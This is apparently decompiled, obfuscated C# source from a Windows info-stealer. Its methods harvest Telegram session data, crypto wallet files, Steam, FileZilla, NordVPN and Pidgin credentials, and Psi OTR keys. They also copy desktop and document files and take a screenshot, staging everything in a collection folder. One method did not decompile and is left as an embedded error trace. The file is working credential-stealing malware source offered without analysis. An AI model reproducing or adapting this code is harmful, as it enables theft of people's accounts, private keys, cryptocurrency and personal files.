using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using ns14;

namespace ns31
{
	// Token: 0x02000032 RID: 50
	internal class Class17
	{
		// Token: 0x060001BB RID: 443 RVA: 0x0000D794 File Offset: 0x0000B994
		public static void smethod_0()
		{
			/*
An exception occurred when decompiling this method (060001BB)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void ns31.Class17::smethod_0()
 ---> System.Exception: Inconsistent stack size at IL_3D
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 443
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
		}

		// Token: 0x060001BC RID: 444 RVA: 0x0000D7E4 File Offset: 0x0000B9E4
		public static void smethod_2(DirectoryInfo directoryInfo_0, DirectoryInfo directoryInfo_1)
		{
			try
			{
				foreach (FileInfo fileInfo in directoryInfo_0.GetFiles())
				{
					fileInfo.CopyTo(Path.Combine(directoryInfo_1.ToString(), fileInfo.Name), true);
				}
				foreach (DirectoryInfo directoryInfo in directoryInfo_0.GetDirectories())
				{
					DirectoryInfo directoryInfo_2 = directoryInfo_1.CreateSubdirectory(directoryInfo.Name);
					Class17.smethod_2(directoryInfo, directoryInfo_2);
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001BD RID: 445 RVA: 0x0000D86C File Offset: 0x0000BA6C
		public static void smethod_3()
		{
			string path = GClass9.string_2 + "\\Psi\\profiles\\default\\";
			try
			{
				if (Directory.Exists(path))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\Psi");
					foreach (string text in Directory.GetFiles(path))
					{
						try
						{
							FileInfo fileInfo = new FileInfo(text);
							if (fileInfo.Name == "accounts.xml")
							{
								File.Copy(text, GClass9.string_6 + "\\Psi\\accounts.xml");
							}
							if (fileInfo.Name == "otr.keys")
							{
								File.Copy(text, GClass9.string_6 + "\\Psi\\otr.keys");
							}
							if (fileInfo.Name == "otr.fingerprints")
							{
								File.Copy(text, GClass9.string_6 + "\\Psi\\otr.fingerpits");
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001BE RID: 446 RVA: 0x0000D970 File Offset: 0x0000BB70
		public static void smethod_4()
		{
			try
			{
				if (Directory.Exists(GClass9.string_2 + "\\NordVPN"))
				{
					string[] directories = Directory.GetDirectories(GClass9.string_2 + "\\NordVPN");
					Directory.CreateDirectory(GClass9.string_6 + "\\NordVPN");
					foreach (string text in directories)
					{
						if (text.StartsWith(GClass9.string_2 + "\\NordVPN\\NordVPN.exe"))
						{
							string name = new DirectoryInfo(text).Name;
							string[] directories2 = Directory.GetDirectories(text);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\Windows\\Vpn\\NordVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
							{
								GClass9.string_6,
								"\\NordVPN",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}));
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001BF RID: 447 RVA: 0x0000DB08 File Offset: 0x0000BD08
		public static void smethod_5(string string_0)
		{
			try
			{
				string[] directories = Directory.GetDirectories(string_0);
				int i = 0;
				while (i < directories.Length)
				{
					string text = directories[i];
					try
					{
						if (text == GClass9.string_2 + "\\Microsoft")
						{
							goto IL_213;
						}
						if (text == GClass9.string_1 + "\\Application Data")
						{
							goto IL_213;
						}
						if (text == GClass9.string_1 + "\\History")
						{
							goto IL_213;
						}
						if (text == GClass9.string_1 + "\\Microsoft")
						{
							goto IL_213;
						}
						if (text == GClass9.string_1 + "\\Temporary Internet Files")
						{
							goto IL_213;
						}
						foreach (string text2 in Directory.GetFiles(text))
						{
							FileInfo fileInfo = new FileInfo(text2);
							if (fileInfo.Name == "wallet.dat" || fileInfo.Name == "wallet" || fileInfo.Name == "default_wallet.dat" || fileInfo.Name == "default_wallet" || fileInfo.Name.EndsWith("wallet") || fileInfo.Name.EndsWith("bit") || fileInfo.Name.StartsWith("wallet"))
							{
								Directory.CreateDirectory(GClass9.string_6 + "\\Wallets");
								try
								{
									if (!fileInfo.Name.EndsWith(".log"))
									{
										string name = new DirectoryInfo(text).Name;
										Directory.CreateDirectory(GClass9.string_6 + "\\Wallets\\" + name);
										File.Copy(text2, string.Concat(new string[]
										{
											GClass9.string_6,
											"\\Wallets\\",
											name,
											"\\",
											fileInfo.Name
										}));
									}
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
					goto IL_20D;
					IL_213:
					i++;
					continue;
					IL_20D:
					Class17.smethod_5(text);
					goto IL_213;
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x0000DD88 File Offset: 0x0000BF88
		public static void smethod_6()
		{
			string[] array = new string[]
			{
				"\\D877F783D5D3EF8C1",
				"\\D877F783D5D3EF8C0",
				"\\D877F783D5D3EF8C\\map1",
				"\\D877F783D5D3EF8C\\map0"
			};
			try
			{
				if (Process.GetProcessesByName("Telegram").Length != 0)
				{
					using (IEnumerator enumerator = Process.GetProcessesByName("Telegram")[0].Modules.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							string fileName = ((ProcessModule)enumerator.Current).FileName;
							string text = fileName.Remove(fileName.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";
							if (Directory.Exists(text))
							{
								Directory.CreateDirectory(GClass9.string_6 + "\\Telegram");
							}
							if (!Directory.Exists(GClass9.string_6 + "\\Telegram\\D877F783D5D3EF8C"))
							{
								Directory.CreateDirectory(GClass9.string_6 + "\\Telegram\\D877F783D5D3EF8C");
							}
							foreach (string text2 in array)
							{
								try
								{
									File.Copy(text + text2, GClass9.string_6 + "\\Telegram" + text2, true);
								}
								catch
								{
								}
							}
						}
						goto IL_24A;
					}
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
				string text3 = (string)registryKey.GetValue(null);
				registryKey.Close();
				string text4 = text3.Remove(text3.LastIndexOf('\\') + 1).Replace('"', ' ') + "tdata";
				if (Directory.Exists(text4))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\Telegram");
				}
				if (!Directory.Exists(GClass9.string_6 + "\\Telegram\\D877F783D5D3EF8C"))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\Telegram\\D877F783D5D3EF8C");
				}
				foreach (string text5 in array)
				{
					try
					{
						File.Copy(text4 + text5, GClass9.string_6 + "\\Telegram" + text5, true);
					}
					catch
					{
					}
				}
				IL_24A:;
			}
			catch
			{
			}
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x0000E048 File Offset: 0x0000C248
		public static void smethod_7()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string text = Path.Combine(GClass9.string_2, ".purple\\accounts.xml");
			if (File.Exists(text))
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(new XmlTextReader(text));
					foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string innerText = xmlNode.ChildNodes[0].InnerText;
						string innerText2 = xmlNode.ChildNodes[1].InnerText;
						string innerText3 = xmlNode.ChildNodes[2].InnerText;
						if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
						{
							break;
						}
						stringBuilder.AppendLine("Protocol: " + innerText);
						stringBuilder.AppendLine("Login: " + innerText2);
						stringBuilder.AppendLine("Password: " + innerText3 + "\r\n");
					}
					if (stringBuilder.Length > 0)
					{
						Directory.CreateDirectory(GClass9.string_6 + "\\Pidgin");
						try
						{
							File.AppendAllText(GClass9.string_6 + "\\Pidgin\\Logins.txt", stringBuilder.ToString());
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				Class17.smethod_0();
			}
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x0000E1FC File Offset: 0x0000C3FC
		public static void smethod_8()
		{
			Directory.CreateDirectory(GClass9.string_6 + "\\Desktop");
			Directory.CreateDirectory(GClass9.string_6 + "\\Documents");
			DirectoryInfo directoryInfo = new DirectoryInfo(GClass9.string_4);
			DirectoryInfo directoryInfo2 = new DirectoryInfo(GClass9.string_3);
			try
			{
				foreach (FileInfo fileInfo in directoryInfo2.GetFiles())
				{
					foreach (string value in Class17.list_0)
					{
						if (fileInfo.Extension.Equals(value) && fileInfo.Length <= (long)Class17.int_0)
						{
							fileInfo.CopyTo(GClass9.string_6 + "\\Desktop\\" + fileInfo.Name);
						}
					}
				}
			}
			catch
			{
			}
			foreach (DirectoryInfo directoryInfo3 in directoryInfo2.GetDirectories())
			{
				foreach (FileInfo fileInfo2 in directoryInfo3.GetFiles())
				{
					foreach (string value2 in Class17.list_0)
					{
						if (fileInfo2.Extension.Equals(value2) && fileInfo2.Length <= (long)Class17.int_0)
						{
							try
							{
								if (!Directory.Exists(string.Format("{0}\\Desktop\\{1}", GClass9.string_6, directoryInfo3)))
								{
									Directory.CreateDirectory(string.Format("{0}\\Desktop\\{1}", GClass9.string_6, directoryInfo3));
								}
								fileInfo2.CopyTo(string.Format("{0}\\Desktop\\{1}\\{2}", GClass9.string_6, directoryInfo3, fileInfo2));
							}
							catch
							{
							}
						}
					}
				}
			}
			try
			{
				foreach (FileInfo fileInfo3 in directoryInfo.GetFiles())
				{
					foreach (string value3 in Class17.list_0)
					{
						if (fileInfo3.Extension.Equals(value3) && fileInfo3.Length <= (long)Class17.int_0)
						{
							fileInfo3.CopyTo(GClass9.string_6 + "\\Documents\\" + fileInfo3.Name);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x0000E4C0 File Offset: 0x0000C6C0
		public static void smethod_9()
		{
			int width = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
			int height = int.Parse(Screen.PrimaryScreen.Bounds.Width.ToString());
			Bitmap bitmap = new Bitmap(width, height);
			Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, blockRegionSize);
			string filename = GClass9.string_6 + "\\screenshot.jpg";
			bitmap.Save(filename);
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0000E564 File Offset: 0x0000C764
		public static void smethod_10()
		{
			string[] array = new string[]
			{
				"config.vdf",
				"loginusers.vdf",
				"DialogConfig.vdf"
			};
			if (Directory.Exists(GClass9.string_9))
			{
				GClass9.list_0.Add("[✅] Steam");
				Directory.CreateDirectory(GClass9.string_11);
				Directory.CreateDirectory(GClass9.string_11 + "\\config");
				foreach (string str in array)
				{
					try
					{
						File.Copy(GClass9.string_10 + "\\" + str, GClass9.string_11 + "\\config\\" + str);
					}
					catch
					{
					}
				}
				foreach (FileInfo fileInfo in new DirectoryInfo(GClass9.string_9).GetFiles("ssfn*"))
				{
					File.Copy(fileInfo.FullName, GClass9.string_11 + "\\" + fileInfo.Name, true);
				}
			}
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0000E690 File Offset: 0x0000C890
		public static void smethod_11()
		{
			if (Directory.Exists(GClass9.string_7))
			{
				GClass9.list_0.Add("[✅] FileZilla");
				string[] array = new string[]
				{
					"recentservers.xml",
					"sitemanager.xml"
				};
				if (!Directory.Exists(GClass9.string_6 + "\\FileZilla"))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\FileZilla");
				}
				foreach (string str in array)
				{
					try
					{
						File.Copy(GClass9.string_7 + "\\" + str, GClass9.string_6 + "\\FileZilla\\" + str);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x040000BC RID: 188
		public static int int_0;

		// Token: 0x040000BD RID: 189
		public static List<string> list_0 = new List<string>();
	}
}
